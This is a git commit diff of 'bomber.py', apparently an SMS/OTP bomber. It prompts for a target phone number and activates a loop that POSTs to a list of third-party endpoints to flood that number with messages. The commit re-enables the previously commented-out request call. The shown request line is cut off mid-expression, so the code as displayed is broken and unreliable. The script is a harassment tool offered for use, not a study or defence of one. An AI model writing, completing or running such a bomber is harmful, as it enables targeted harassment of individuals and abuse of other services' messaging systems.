bc32e08da20432812c50d4acad74cd32d47f132b
dhruvmanjhi02-maker <dhruvmanjhi02@gmail.com>
2025-10-31 17:17:55 +0530

    bomber.py

--- bomber.py
+++ bomber.py
@@ -1,27 +1,27 @@
 from data_cs import data
 import requests,time,json,warnings
-from logo import banner, attack
-import threading
-
+from logo import banner, attack,P,Y
+import threading, os
 warnings.filterwarnings("ignore")
 
 banner()
 
+u = input(f'{Y}Enter Target Number: ')
 
 def bomber():
     for i in data:
-        # r = requests.post(i[0]['url'], headers=i[1],data=json.dumps(i[2], separators=(',', ':')), verify=False)
-        # print(r.status_code)
-        # time.sleep(2.5)
+        r = requests.post(i[0]['url'], headers=i[1],data=json.dumps(i[2], separators=(',>
+        time.sleep(2.5)
         print()
-
 t1 = threading.Thread(target=attack)
 t2 = threading.Thread(target=bomber)
 
 t1.start()
 t2.start()
 
-t1.join()
-t2.join()
-
-
+try:
+    t1.join()
+    t2.join()
+except KeyboardInterrupt:
+    os.system("clear")
+    print(f'{P}Tool Exit! Thanks for Using.')
